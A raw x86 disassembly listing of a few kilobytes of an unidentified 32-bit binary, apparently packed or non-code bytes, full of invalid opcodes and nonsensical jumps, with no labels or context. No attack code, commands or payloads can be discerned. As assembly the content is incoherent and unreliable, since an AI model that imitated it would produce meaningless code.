  40e6ce:	mov    eax,DWORD PTR [edx-0x20]
  40e6d1:	add    BYTE PTR [ebp-0x75],bh
  40e6d4:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e6db:	fwait
  40e6dc:	retf   0x8632
  40e6df:	cmp    ebp,0x8
  40e6e2:	call   ebx
  40e6e4:	inc    ebp
  40e6e5:	inc    ebp
  40e6e6:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e6ec:	mov    esi,DWORD PTR [ecx]
  40e6ee:	enter  0x49c,0xc7
  40e6f2:	add    al,al
  40e6f4:	add    bl,al
  40e6f6:	(bad)  
  40e6f7:	clc    
  40e6f8:	enter  0x45,0x31
  40e6fc:	push   eax
  40e6fd:	pushf  
  40e6fe:	mov    edi,eax
  40e700:	int3   
  40e701:	or     al,al
  40e703:	test   DWORD PTR [edi],edi
  40e705:	clc    
  40e706:	gs inc ebp
  40e708:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e70e:	push   ss
  40e70f:	xor    ecx,DWORD PTR [ebp+0x3]
  40e712:	sub    edx,DWORD PTR [ecx-0x76]
  40e715:	dec    ebp
  40e716:	add    DWORD PTR [ebx+0x88d845],ecx
  40e71c:	mov    esi,DWORD PTR [ebx]
  40e71e:	or     BYTE PTR [ebx],al
  40e720:	cmp    edx,DWORD PTR [ecx-0x38]
  40e723:	dec    ebp
  40e724:	out    dx,eax
  40e725:	xor    eax,DWORD PTR [ebp+0x3]
  40e728:	mov    edx,DWORD PTR [ecx-0x28]
  40e72b:	dec    ebp
  40e72c:	add    BYTE PTR [ebx],dh
  40e72e:	push   0x518003
  40e733:	push   eax
  40e734:	add    BYTE PTR [ebx-0x300748b],cl
  40e73a:	sbb    BYTE PTR [ebp+0x45],cl
  40e73d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e743:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e749:	dec    ebp
  40e74a:	inc    ebp
  40e74b:	xor    edx,esi
  40e74d:	add    edx,esi
  40e74f:	push   ecx
  40e750:	(bad)  
  40e751:	dec    ebp
  40e752:	mov    al,ds:0xc5e03dff
  40e757:	retf   
  40e758:	(bad)  
  40e759:	into   
  40e75a:	sub    bh,bh
  40e75c:	dec    esp
  40e75d:	adc    al,0x9c
  40e75f:	inc    ebp
  40e760:	push   ebp
  40e761:	test   DWORD PTR [edi],ecx
  40e763:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  40e76a:	jmp    0xc9b9f67e
  40e76f:	add    cl,dl
  40e771:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e77b:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e781:	rol    BYTE PTR [eax],0x54
  40e784:	clc    
  40e785:	gs jb  0x40e78f
  40e788:	mov    eax,DWORD PTR [ebp-0x30]
  40e78b:	xor    al,0x40
  40e78d:	sub    al,0xc7
  40e78f:	mov    ah,ch
  40e791:	add    DWORD PTR [ebp+0x4534f845],eax
  40e797:	sub    al,0x80
  40e799:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e7a0:	mov    ch,0xff
  40e7a2:	clc    
  40e7a3:	add    DWORD PTR [ebp+0x60],0x3d
  40e7a7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e7ae:	inc    ebp
  40e7af:	dec    DWORD PTR [ebx-0x341ff701]
  40e7b5:	test   esi,ecx
  40e7b7:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e7bd:	push   eax
  40e7be:	add    DWORD PTR [ebp+0x0],eax
  40e7c1:	dec    ebx
  40e7c3:	or     al,0xce
  40e7c5:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e7cc:	into   
  40e7cd:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e7d3:	mov    esi,ecx
  40e7d5:	sar    bh,0x45
  40e7d8:	adc    al,0x8b
  40e7da:	clc    
  40e7db:	fadd   DWORD PTR [ebp+0x0]
  40e7de:	mov    ebp,DWORD PTR [edx+0x8]
  40e7e1:	push   edi
  40e7e2:	adc    BYTE PTR [eax+0x1],0x83
  40e7e6:	add    al,al
  40e7e8:	retf   
  40e7e9:	mov    ecx,esi
  40e7eb:	cld    
  40e7ec:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e7f2:	into   
  40e7f3:	add    BYTE PTR [ebx+0x756aec00],cl
  40e7f9:	jne    0x40e82e
  40e7fb:	inc    DWORD PTR [ebx]
  40e7fd:	rcl    BYTE PTR [ecx+0x50],1
  40e800:	push   eax
  40e801:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e807:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e80e:	sar    bh,0x84
  40e811:	or     BYTE PTR [ebx],al
  40e813:	push   eax
  40e814:	add    BYTE PTR [ebx+0x453cc845],cl
  40e81a:	pushf  
  40e81b:	xor    edi,eax
  40e81d:	pushf  
  40e81e:	mov    ah,0x89
  40e820:	test   eax,ebp
  40e822:	clc    
  40e823:	inc    ebp
  40e824:	inc    ebp
  40e825:	mov    DWORD PTR [eax+eax*8],esi
  40e828:	sub    al,0x32
  40e82a:	mov    BYTE PTR [ebx+ecx*4+0x54d8ec89],bl
  40e831:	dec    ebp
  40e832:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e836:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  40e83c:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e840:	or     DWORD PTR [ecx+0x45ff085c],0x0
  40e847:	shl    DWORD PTR [ebp-0x380064],1
  40e84d:	int3   
  40e84e:	lea    eax,[ebp+0x45fff860]
  40e854:	push   eax
  40e855:	cmp    al,0x75
  40e857:	pushf  
  40e858:	(bad)  
  40e859:	(bad)  
  40e85a:	pop    esp
  40e85b:	lods   al,BYTE PTR ds:[esi]
  40e85c:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e862:	mov    edi,DWORD PTR [esi]
  40e864:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e86b:	test   DWORD PTR [edi-0x8],edx
  40e86e:	inc    esi
  40e86f:	inc    ebp
  40e870:	add    BYTE PTR [eax],bh
  40e872:	push   0x8b809c
  40e877:	in     al,dx
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	mov    esi,DWORD PTR [ebx]
  40e87c:	cld    
  40e87d:	add    eax,DWORD PTR [eax+0xf013b]
  40e883:	adc    al,0x0
  40e885:	add    bh,bh
  40e887:	jmp    0xbde9a4
  40e88c:	add    BYTE PTR [ebp+0x45],cl
  40e88f:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e895:	dec    ebp
  40e896:	push   0x38033
  40e89b:	cmp    eax,DWORD PTR [eax]
  40e89d:	unpcklps xmm7,xmm0
  40e8a0:	jne    0x40e8a2
  40e8a2:	dec    DWORD PTR [ebx+0x5545cc18]
  40e8a8:	mov    DWORD PTR [ebx],esi
  40e8aa:	shl    BYTE PTR [ebx],1
  40e8ac:	inc    ebp
  40e8ad:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e8b3:	retf   0x5575
  40e8b6:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e8bc:	(bad)  
  40e8bd:	stc    
  40e8be:	in     al,dx
  40e8bf:	or     al,0x85
  40e8c1:	dec    ebp
  40e8c2:	clc    
  40e8c3:	xor    eax,DWORD PTR [ebp+0x3]
  40e8c6:	mov    ebp,ecx
  40e8c8:	rol    BYTE PTR [eax],1
  40e8ca:	inc    ebp
  40e8cb:	add    BYTE PTR [eax-0x7747ab3],bh
  40e8d1:	clc    
  40e8d2:	inc    ebp
  40e8d3:	retf   
  40e8d4:	mov    edx,ebx
  40e8d6:	in     al,dx
  40e8d7:	(bad)  
  40e8d8:	retf   
  40e8d9:	into   
  40e8da:	into   
  40e8db:	scas   eax,DWORD PTR es:[edi]
  40e8dc:	dec    ebp
  40e8dd:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e8e3:	sub    ecx,esi
  40e8e5:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e8e8:	(bad)  
  40e8e9:	mov    edi,eax
  40e8eb:	int3   
  40e8ec:	test   DWORD PTR [ecx-0x74baff08],ecx
  40e8f2:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40e8f9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e8ff:	(bad)  
  40e901:	retf   0x559c
  40e904:	(bad)  
  40e905:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40e90c:	inc    ebp
  40e90d:	add    eax,0xeb9c4d3f
  40e912:	(bad)  
  40e913:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40e919:	xor    ecx,DWORD PTR [ebp+0x33]
  40e91c:	mov    eax,DWORD PTR [ebx]
  40e91e:	call   0xce50b426
  40e923:	retf   0x55d1
  40e926:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40e92c:	jmp    0x40e927
  40e92e:	add    BYTE PTR ds:0xebf44d8b,al
  40e934:	push   ebp
  40e935:	mov    ebp,DWORD PTR [ebx]
  40e937:	mov    eax,0x33f8558b
  40e93c:	retf   
  40e93d:	xor    ecx,esi
  40e93f:	add    edx,ecx
  40e941:	add    eax,DWORD PTR [edx+0xca010f]
  40e947:	push   ebp
  40e948:	dec    ebp
  40e949:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40e94f:	stc    
  40e950:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e956:	scas   eax,DWORD PTR es:[edi]
  40e957:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40e95d:	xor    ebp,DWORD PTR [ebx]
  40e95f:	xor    edi,DWORD PTR [ebx]
  40e961:	add    esi,DWORD PTR [edi+0x3]
  40e964:	mov    ecx,DWORD PTR [edi]
  40e966:	clc    
  40e967:	retf   0x55cb
  40e96a:	into   
  40e96b:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40e972:	test   al,0x4d
  40e974:	push   ebp
  40e975:	jbe    0x40e9aa
  40e977:	mov    esi,DWORD PTR [ebx]
  40e979:	mov    al,0x3
  40e97b:	push   ebp
  40e97c:	add    esi,DWORD PTR [ebx]
  40e97e:	rdpmc  
  40e980:	retf   0x5503
  40e983:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40e989:	dec    ebp
  40e98a:	stc    
  40e98b:	mov    ecx,DWORD PTR [eax]
  40e98d:	or     BYTE PTR [ebp+0x4d],cl
  40e990:	jmp    0x134ea20
  40e995:	dec    ebp
  40e996:	dec    ebp
  40e997:	(bad)  
  40e998:	mov    ebx,esp
  40e99a:	clc    
  40e99b:	test   ebx,ecx
  40e99d:	clc    
  40e99e:	ror    DWORD PTR [ebp-0x2a],cl
  40e9a1:	mov    esi,ecx
  40e9a3:	lock scas eax,DWORD PTR es:[edi]
  40e9a5:	inc    ebp
  40e9a6:	mov    esi,DWORD PTR [ebx]
  40e9a8:	hlt    
  40e9a9:	pushf  
  40e9aa:	jge    0x40e937
  40e9ac:	sub    ebx,esp
  40e9ae:	cmp    ecx,ebx
  40e9b0:	ja     0x40e980
  40e9b2:	mov    ebp,DWORD PTR [eax-0x58]
  40e9b5:	dec    ebp
  40e9b6:	xor    ecx,DWORD PTR [di+0x3]
  40e9ba:	mov    esp,esp
  40e9bc:	clc    
  40e9bd:	push   ebp
  40e9be:	retf   
  40e9bf:	mov    dl,bl
  40e9c1:	adc    esi,edx
  40e9c3:	jb     0x40e993
  40e9c5:	add    BYTE PTR [edi-0xb7474b3],ch
  40e9cb:	lock jge 0x40e999
  40e9ce:	sub    ecx,DWORD PTR [ebp+0x3b]
  40e9d1:	mov    esi,DWORD PTR [edi-0x20]
  40e9d4:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  40e9db:	mov    BYTE PTR [ebx-0x34b20729],cl
  40e9e1:	mov    edx,ebx
  40e9e3:	lock (bad) 
  40e9e5:	ror    esi,cl
  40e9e7:	push   ebp
  40e9e8:	scas   eax,DWORD PTR es:[edi]
  40e9e9:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40e9ef:	fwait
  40e9f0:	sub    esi,DWORD PTR [edx]
  40e9f2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9f9:	xor    esp,DWORD PTR [ebx]
  40e9fb:	add    ecx,DWORD PTR [ebp-0x1c]
  40e9fe:	mov    edi,DWORD PTR [ebp-0x8]
  40ea01:	mov    bl,cl
  40ea03:	cmp    dl,bl
  40ea05:	jb     0x40e9d5
  40ea07:	add    dh,dl
  40ea09:	dec    ebp
  40ea0a:	scas   eax,DWORD PTR es:[edi]
  40ea0b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ea11:	shr    DWORD PTR [ebx],cl
  40ea13:	into   
  40ea14:	cmp    edx,esi
  40ea16:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ea1c:	dec    ebp
  40ea1d:	dec    ebp
  40ea1e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ea24:	retf   
  40ea25:	xor    edx,esi
  40ea27:	add    ecx,esi
  40ea29:	imul   ecx,edx
  40ea2c:	mov    DWORD PTR [ebp+0x8],edx
  40ea2f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ea32:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ea38:	add    esi,DWORD PTR [ebx]
  40ea3a:	rol    BYTE PTR [ebx],0x45
  40ea3d:	rdtsc  
  40ea3f:	xlat   BYTE PTR ds:[ebx]
  40ea40:	pushf  
  40ea41:	jge    0x40e9cc
  40ea43:	xor    esp,eax
  40ea45:	sub    eax,DWORD PTR [ebp-0x73]
  40ea48:	(bad)  
  40ea49:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ea50:	dec    ebp
  40ea51:	xchg   BYTE PTR [ebx],dh
  40ea53:	inc    DWORD PTR [ebx]
  40ea55:	(bad)  
  40ea56:	jmp    0x40eaa5
  40ea58:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40ea5e:	dec    ebp
  40ea5f:	into   
  40ea60:	mov    ebp,DWORD PTR [edi-0x23737420]
  40ea66:	fwait
  40ea67:	shl    DWORD PTR [edx],cl
  40ea69:	retf   0x5588
  40ea6c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40ea72:	add    eax,DWORD PTR [eax]
  40ea74:	in     al,0x4d
  40ea76:	push   ebp
  40ea77:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40ea7d:	gs add ch,cl
  40ea80:	dec    ebp
  40ea81:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40ea87:	dec    ebp
  40ea88:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40ea8e:	jge    0x40ea5e
  40ea90:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ea96:	add    cl,dh
  40ea98:	dec    ebp
  40ea99:	dec    DWORD PTR [ebx-0x2c032301]
  40ea9f:	inc    ebp
  40eaa0:	push   ebp
  40eaa1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40eaa7:	lea    ebx,[ebx-0x7400cdac]
  40eaad:	push   eax
  40eaae:	mov    ah,0x45
  40eab0:	push   ebp
  40eab1:	mov    esi,DWORD PTR [ebx]
  40eab3:	les    esi,FWORD PTR [ebx]
  40eab5:	add    BYTE PTR [ebx],al
  40eab7:	inc    DWORD PTR [ebx]
  40eab9:	mov    ecx,DWORD PTR [edi]
  40eabb:	cld    
  40eabc:	retf   0x4d80
  40eabf:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40eac5:	jne    0x40ea52
  40eac7:	(bad)  
  40eac8:	in     al,dx
  40eac9:	ror    bl,1
  40eacb:	scas   al,BYTE PTR es:[edi]
  40eacc:	into   
  40eacd:	add    BYTE PTR [edi-0xf2f7475],ch
  40ead3:	not    bl
  40ead5:	adc    al,0xca
  40ead7:	inc    ebp
  40ead8:	push   ebp
  40ead9:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40eadf:	push   0xaf80d6
  40eae4:	mov    eax,DWORD PTR [eax]
  40eae6:	fdiv   st(7),st
  40eae8:	sti    
  40eae9:	sbb    dh,cl
  40eaeb:	pop    esi
  40eaec:	xchg   esp,eax
  40eaed:	leave  
  40eaee:	fwait
  40eaef:	add    al,0x32
  40eaf1:	push   ebp
  40eaf2:	cmp    ebp,esp
  40eaf4:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40eaf8:	dec    DWORD PTR [ecx-0x740f0375]
  40eafe:	push   ebp
  40eaff:	cld    
  40eb00:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40eb06:	retf   0x558b
  40eb09:	clc    
  40eb0a:	xor    esi,eax
  40eb0c:	add    esi,DWORD PTR [ebp-0x75]
  40eb0f:	(bad)  
  40eb10:	hlt    
  40eb11:	or     cl,BYTE PTR [esi+eax*8-0x39cdf765]
  40eb18:	mov    DWORD PTR [edx],ecx
  40eb1a:	hlt    
  40eb1b:	(bad)  
  40eb1c:	dec    ebp
  40eb1d:	add    dh,BYTE PTR [ebx]
  40eb1f:	leave  
  40eb20:	mov    edx,0xffec8d55
  40eb25:	push   ecx
  40eb26:	rol    DWORD PTR [ebp+0x55],1
  40eb29:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40eb2f:	mov    eax,0xf8030b33
  40eb34:	lar    ecx,di
  40eb37:	push   ebp
  40eb38:	retf   0x863b
  40eb3b:	jne    0x40eb3a
  40eb3d:	mov    edi,edi
  40eb3f:	or     BYTE PTR [ebp+0x41],dh
  40eb42:	mov    ebp,edx
  40eb44:	cld    
  40eb45:	inc    eax
  40eb46:	mov    al,0x25
  40eb48:	add    DWORD PTR [ecx+0x0],eax
  40eb4b:	in     eax,dx
  40eb4c:	test   DWORD PTR [ecx-0x1],eax
  40eb4f:	(bad)  
  40eb51:	ret    0x8b
  40eb54:	cld    
  40eb55:	mov    eax,DWORD PTR [eax+0x8d0151]
  40eb5b:	clc    
  40eb5c:	xor    BYTE PTR [ebp+0x45],al
  40eb5f:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40eb65:	loopne 0x40eb66
  40eb67:	mov    edi,edi
  40eb69:	mov    ecx,eax
  40eb6b:	clc    
  40eb6c:	jne    0x40eb3e
  40eb6e:	call   0x81fc77
  40eb73:	and    eax,0xc6854575
  40eb78:	je     0x40eb7b
  40eb7a:	mov    eax,esi
  40eb7c:	cld    
  40eb7d:	or     DWORD PTR [eax+0x401c9],eax
  40eb83:	push   ebp
  40eb84:	add    ah,ch
  40eb86:	add    BYTE PTR [ecx+0x6a],dl
  40eb89:	inc    ebp
  40eb8a:	push   esi
  40eb8b:	mov    DWORD PTR [eax-0x4],edx
  40eb8e:	pop    edi
  40eb8f:	mov    ebx,DWORD PTR [ebx-0x4]
  40eb92:	ret    0xb8
  40eb95:	push   es
  40eb96:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40eb9c:	clc    
  40eb9d:	lock inc ebp
  40eb9f:	jne    0x40ebf7
  40eba1:	(bad)  
  40eba2:	jne    0x40eba8
  40eba4:	mov    eax,0xf841ba66
  40eba9:	fiadd  DWORD PTR [esi]
  40ebab:	(bad)  
  40ebac:	jne    0x40ebeb
  40ebae:	cmp    eax,ebx
  40ebb0:	pop    esi
  40ebb1:	mov    ecx,DWORD PTR [eax]
  40ebb3:	push   ecx
  40ebb4:	inc    ecx
  40ebb5:	lea    edi,[esi-0x8]
  40ebb8:	inc    edx
  40ebb9:	inc    ebp
  40ebba:	int    0x8b
  40ebbc:	inc    edx
  40ebbd:	cld    
  40ebbe:	jle    0x40eb7f
  40ebc0:	inc    ecx
  40ebc1:	xchg   eax,esp
  40ebc3:	mov    ebx,eax
  40ebc5:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ebcb:	or     edi,eax
  40ebcd:	inc    ebp
  40ebce:	inc    ebp
  40ebcf:	(bad)  
  40ebd0:	mov    ecx,DWORD PTR [eax]
  40ebd2:	cld    
  40ebd3:	(bad)  
  40ebd4:	jmp    0x40ebd7
  40ebd6:	mov    eax,esi
  40ebd8:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ebde:	rcl    BYTE PTR [esi+0xf],1
  40ebe1:	iret   
  40ebe2:	inc    ebp
  40ebe3:	leave  
  40ebe4:	(bad)  
  40ebe5:	dec    DWORD PTR [ecx]
  40ebe7:	mov    eax,esi
  40ebe9:	mov    eax,DWORD PTR [edi]
  40ebeb:	mov    dh,0xdd
  40ebee:	push   es
  40ebef:	nop
  40ebf0:	(bad)  
  40ebf1:	inc    DWORD PTR [ebx]
  40ebf3:	push   esi
  40ebf4:	leave  
  40ebf5:	iret   
  40ebf6:	add    al,0x46
  40ebf8:	push   ebp
  40ebf9:	jmp    0xff9241ea
  40ebfe:	inc    ebp
  40ebff:	push   esi
  40ec00:	mov    DWORD PTR [esi-0x4],eax
  40ec03:	in     eax,dx
  40ec04:	push   ebp
  40ec05:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ec0b:	add    al,BYTE PTR [edx]
  40ec0d:	mov    edx,DWORD PTR [ebp-0x17]
  40ec10:	cmp    edi,esi
  40ec12:	jne    0x40ec13
  40ec14:	(bad)  
  40ec15:	push   esi
  40ec16:	pop    es
  40ec17:	push   ebp
  40ec18:	mov    ebp,esp
  40ec1a:	or     BYTE PTR [ebp+0x41],al
  40ec1d:	add    edi,esp
  40ec1f:	sub    BYTE PTR [eax-0x4],al
  40ec22:	retf   0xc275
  40ec25:	add    DWORD PTR [eax],eax
  40ec27:	sbb    al,0x8b
  40ec29:	mov    edx,DWORD PTR [ecx+0x14]
  40ec2c:	lea    edx,[edx-0x1ba7508]
  40ec32:	push   esi
  40ec33:	enter  0xd375,0xb8
  40ec37:	test   DWORD PTR [esi],0x6ce0750
  40ec3d:	enter  0xd375,0x3b
  40ec41:	neg    DWORD PTR [esi+0x50]
  40ec44:	or     cl,dl
  40ec46:	inc    edx
  40ec47:	(bad)  
  40ec48:	loope  0x40ec36
  40ec4a:	(bad)  
  40ec4b:	sub    eax,DWORD PTR [ebx]
  40ec4d:	inc    eax
  40ec4e:	loope  0x40eca0
  40ec50:	add    dl,BYTE PTR [eax-0x37]
  40ec53:	push   edi
  40ec54:	push   ebp
  40ec55:	imul   ah
  40ec57:	adc    DWORD PTR [ecx-0x1],0x45
  40ec5b:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ec61:	lea    edi,[eax-0x7fff4ca]
  40ec67:	mov    eax,0x4550402
  40ec6c:	cmp    ebp,ecx
  40ec6e:	jne    0x40ec1b
  40ec70:	mov    eax,DWORD PTR ds:0x241e808
  40ec76:	in     eax,dx
  40ec77:	add    BYTE PTR [eax-0x7],al
  40ec7a:	out    0x36,eax
  40ec7c:	inc    ecx
  40ec7d:	aas    
  40ec7e:	jmp    0xccaf00
  40ec83:	lock mov edi,DWORD PTR [ebp-0x18]
  40ec87:	and    edi,edi
  40ec89:	mov    edi,edi
  40ec8b:	call   0xe40eed67
  40ec90:	push   es
  40ec91:	add    al,ch
  40ec93:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40ec9a:	(bad)  
  40ec9b:	hlt    
  40ec9c:	add    eax,0xffd3e87d
  40eca1:	cmp    bh,0x8
  40eca4:	(bad)  
  40eca5:	fld    DWORD PTR [esi]
  40eca7:	out    dx,al
  40eca8:	call   0xff9febb0
  40ecad:	cmp    al,0x46
  40ecaf:	shl    eax,0x8
  40ecb2:	(bad)  
  40ecb3:	pop    es
  40ecb4:	fisttp QWORD PTR [ebp+0xe577eff]
  40ecba:	push   ebx
  40ecbb:	add    BYTE PTR [ebx+0x24008b56],cl
  40ecc1:	add    BYTE PTR [ebp+0x50],al
  40ecc4:	push   eax
  40ecc5:	add    DWORD PTR [ebx+0x757d1834],ecx
  40eccb:	sub    edx,DWORD PTR [esi-0x24]
  40ecce:	jne    0x40ec86
  40ecd0:	lods   eax,DWORD PTR ds:[esi]
  40ecd1:	mov    edx,DWORD PTR [edx-0x34]
  40ecd4:	dec    esi
  40ecd5:	out    0x83,eax
  40ecd7:	into   
  40ecd8:	push   edi
  40ecda:	loopne 0x40ecaa
  40ecdc:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40ece0:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ece7:	rol    DWORD PTR [edx],0x8
  40ecea:	mov    esp,ecx
  40ecec:	cmp    DWORD PTR [ebx],0xc
  40ecef:	mov    esi,0x5001c0
  40ecf4:	push   eax
  40ecf5:	push   cs
  40ecf6:	push   eax
  40ecf7:	(bad)  
  40ecf8:	sub    edx,edi
  40ecfa:	push   esi
  40ecfb:	adc    al,0xcb
  40ecfd:	ins    DWORD PTR es:[edi],dx
  40ecfe:	mov    eax,0x203e8
  40ed03:	add    al,ah
  40ed05:	inc    esi
  40ed06:	mov    al,ch
  40ed08:	pop    es
  40ed09:	add    DWORD PTR [eax],0x1
  40ed0c:	add    dh,al
  40ed0e:	add    ah,ch
  40ed10:	rol    DWORD PTR [edx-0xd],1
  40ed13:	cli    
  40ed14:	push   0x4a
  40ed16:	pop    ecx
  40ed17:	retf   0xfe6
  40ed1a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ed20:	(bad)  
  40ed21:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ed27:	(bad)  
  40ed28:	sub    ebp,DWORD PTR [ebx]
  40ed2a:	and    al,0x52
  40ed2c:	(bad)  
  40ed2d:	dec    edi
  40ed2e:	inc    ebp
  40ed2f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ed36:	add    BYTE PTR [ebp-0x7b],dh
  40ed39:	pop    eax
  40ed3a:	add    BYTE PTR [edx+0x0],bl
  40ed3d:	pop    edx
  40ed3e:	dec    ebp
  40ed3f:	jmp    DWORD PTR [ebx]
  40ed41:	and    al,0xec
  40ed43:	push   edx
  40ed44:	out    0x64,eax
  40ed46:	jmp    0xd3f2e34b
  40ed4b:	jmp    0x40eda5
  40ed4d:	mov    al,0xfe
  40ed4f:	dec    BYTE PTR [ebp-0x18fd8018]
  40ed55:	add    BYTE PTR [esi+ebp*1],bh
  40ed58:	pop    edx
  40ed59:	icebp  
  40ed5a:	mov    eax,cs
  40ed5c:	ins    BYTE PTR es:[edi],dx
  40ed5d:	adc    eax,0x75510000
  40ed62:	mov    esi,0x70158
  40ed67:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ed6d:	mov    edi,esp
  40ed6f:	cld    
  40ed70:	jge    0x40ede7
  40ed72:	(bad)  
  40ed74:	aas    
  40ed75:	and    al,0x6d
  40ed77:	adc    cl,0x1
  40ed7a:	mov    eax,DWORD PTR [eax]
  40ed7c:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ed82:	dec    ebp
  40ed83:	add    eax,ebp
  40ed85:	add    BYTE PTR [edx],al
  40ed87:	fadd   DWORD PTR [eax]
  40ed89:	stc    
  40ed8a:	enter  0xee00,0x8b
  40ed8e:	sbb    eax,0x1
  40ed91:	sbb    esi,ecx
  40ed93:	in     al,0x0
  40ed95:	in     eax,dx
  40ed96:	add    BYTE PTR [eax],al
  40ed98:	jne    0x40ed25
  40ed9a:	cmp    edx,esp
  40ed9c:	jb     0x40eda7
  40ed9e:	jmp    0x40ee15
  40eda0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eda6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40edac:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40edb2:	jb     0x40ed3d
  40edb4:	pop    edx
  40edb5:	fadd   QWORD PTR [ebx-0x7445faa1]
  40edbb:	or     dh,BYTE PTR [edx+0x0]
  40edbe:	inc    edx
  40edbf:	or     dl,bh
  40edc1:	xlat   BYTE PTR ds:[ebx]
  40edc2:	dec    edx
  40edc3:	push   edi
  40edc4:	add    al,0x7
  40edc6:	leave  
  40edc7:	rol    DWORD PTR [edx+eax*1],0x7
  40edcb:	add    ecx,ecx
  40edcd:	mov    edx,ecx
  40edcf:	int3   
  40edd0:	jmp    0x40ed90
  40edd2:	mov    al,0x0
  40edd4:	(bad)  
  40edd5:	jne    0x40edbf
  40edd7:	mov    eax,DWORD PTR [edx]
  40edd9:	call   0xc1556ade
  40edde:	pop    edi
  40eddf:	add    ebx,DWORD PTR [ecx-0x37]
  40ede2:	pop    ecx
  40ede3:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40edea:	push   es
  40edeb:	mov    eax,DWORD PTR [eax]
  40eded:	int3   
  40edee:	add    ch,al
  40edf0:	jae    0x40edda
  40edf2:	int    0x1
  40edf4:	enter  0x3000,0x18
  40edf8:	add    BYTE PTR [ebp+0x75],al
  40edfb:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ee01:	push   0x2
  40ee03:	pop    ecx
  40ee04:	add    BYTE PTR [eax],cl
  40ee06:	push   ebx
  40ee07:	lea    edi,[edi+eax*2]
  40ee0a:	mov    al,0x1
  40ee0c:	jb     0x40ee0e
  40ee0e:	mov    al,0x10
  40ee10:	push   eax
  40ee11:	add    al,0x75
  40ee13:	add    BYTE PTR [ebx],ch
  40ee15:	add    ebx,esp
  40ee17:	int3   
  40ee18:	jne    0x40ee2a
  40ee1a:	movsx  edx,cl
  40ee1d:	add    DWORD PTR [eax],eax
  40ee1f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ee26:	mov    gs,edi
  40ee28:	add    BYTE PTR [eax-0x50],ch
  40ee2b:	add    al,ch
  40ee2d:	mov    eax,DWORD PTR [ecx]
  40ee2f:	sub    eax,DWORD PTR [eax]
  40ee31:	jb     0x40eea8
